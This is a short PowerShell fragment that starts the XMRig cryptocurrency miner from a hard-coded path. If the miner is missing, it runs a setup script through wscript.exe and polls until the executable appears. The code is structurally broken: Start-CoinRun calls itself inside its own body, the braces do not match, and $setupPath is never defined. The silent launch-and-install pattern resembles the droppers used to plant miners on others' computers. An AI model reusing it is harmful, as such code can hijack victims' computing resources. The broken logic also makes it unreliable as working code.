$xmrigPath = "C:\xmrig\xmrig-6.26.0\xmrig.exe"
$xmrigProcessName = "xmrig"
$global:isStarting = $false

function Start-CoinRun {
    $existing = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe not found."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        while (!(Test-Path $xmrigPath)) {
            Start-Sleep -Seconds 3
        }
    }
  }
}
